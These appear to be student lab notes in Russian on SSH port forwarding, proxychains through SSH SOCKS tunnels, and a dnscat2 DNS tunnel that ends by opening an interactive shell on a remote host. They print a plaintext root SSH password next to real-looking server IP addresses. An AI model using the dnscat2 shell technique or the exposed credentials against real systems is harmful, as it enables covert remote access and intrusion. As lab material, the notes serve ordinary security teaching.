3-ья лабораторная

Пароль для SSH серверов: mmthebest

Пункт 1. Установление NfL соединения между двумя хостами

Окно 1:
$ ssh root@95.217.178.35
Password: mmthebest
$ python2 -mSimpleHTTPServer 1234

Окно 2:
$ ssh -NfL localhost:1234:95.217.178.35:1234 root@135.181.38.41
Password: mmthebest

Для демонстрации NfL соединения можно зайти на localhost:1234 в браузере

Пункт 2. ProxyChains

$ sudo apt install proxychains
(Nano предустановлен на Kali, но можно использовать и другой редактор)
$ nano /etc/proxychains.conf

Начиная с [ProxyList], файл нужно переписать в соответствии с последовательностью Proxy:

  [ProxyList]
  # add proxy here ...
  # meanwile
  # defaults set to "tor"

  # socks4 127.0.0.1 9050

  socks5 127.0.0.1 9999
  socks5 95.217.178.35 9999

Окно 1:
$ ssh -NfD 0.0.0.0:9999 root@95.217.178.35

Окно 2:
$ ssh root@95.217.178.35
$ ssh -NfD 0.0.0.0:9999 root@135.181.38.41

Для демонстрации proxychains следует получить через цепочку прокси-серверов какую-либо страницу

К примеру, ip-адрес:

Окно 1:
$ proxychains curl 2ip.ru

Пункт 3. dnscat2

Окно 1:
$ ssh root@95.217.178.35
$ cd dnscat2
$ cd server
$ RUBYOPT='-W:no-deprecated -W:no-experimental' ruby dnscat2.rb --dns host=95.217.178.35, port=53

Окно 2:
$ ssh root@135.181.38.41
$ cd dnscat2
$ cd client
$ ./dnscat --dns server=95.217.178.35

Окно 1:

$ session -i 1
$ shell
$ session -i 2
